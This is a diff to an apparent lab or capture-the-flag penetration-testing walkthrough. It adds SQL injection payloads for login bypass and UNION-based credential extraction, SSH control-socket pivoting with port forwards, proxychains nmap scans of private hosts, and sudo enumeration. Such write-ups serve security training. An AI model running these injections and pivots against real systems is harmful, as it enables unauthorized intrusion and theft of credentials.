@@ -27,7 +27,7 @@ vulnerable#   cat /var/ww/.ssh/authorized_keys
 URL/<IP address>/login.php?username=bob' OR 1='1&passwd=bob' OR 1='1    (Gather all contents into login.php)
 
 --Upload link reveals that malicious injection could be used--
-
+-------------------------------------------------------------------------------------------------------------------
 
 #### Step 3 ####
 -Create Master Socket-
@@ -51,17 +51,35 @@ user2@public#  sudo -l
   select * from session_log;
   select * from user;
   exit
+  <ping sweep script>  (identify all IP in network)
+                        192.168.28.165
+                        192.168.28.175
+
+lin-ops#  ssh -S /tmp/jump jump -O forward  -D9050
+lin-ops#  proxychains nmap 192.168.28.175        192.168.28.165
+                            port 2222, 8000        port 22, 8888
+                                              
+lin-ops#  ssh -S /tmp/jump jump -O forward -L1111:192.168.28.175:8000
+-----------------------------------------------------------------------
+127.0.0.1:1111
+#SQL Injection#
+product=1 or 1=1    (keep incrementing product #)
+product=7 UNION SELECT 1,2,3    (identify amount of columns)
+product=7 UNION SELECT table_schema,column_name,table_name FROM information_schema.columns    (Golden statement/Search for user created)
+                                                    information_schema
+                               DEFAULT DATABASES    mysql
+                                                    performance_schema
+
+product=7 UNION SELECT user_id,name,username FROM siteusers.users    (credentials located)
+
+lin-ops#  ssh -S /tmp/jump jump -O forward -L2222:192.168.28.165:22
+lin-ops#  ssh -MS /tmp/Round user3@127.0.0.1 -p 2222
+lin-ops#  ssh -S /tmp/Round jump
+$  shell
+user3@Round#  sudo -l
+  ls /var/tmp
+  ps -elf
   
-
-
-
-
-
-
-
-
-
-
 
 
 
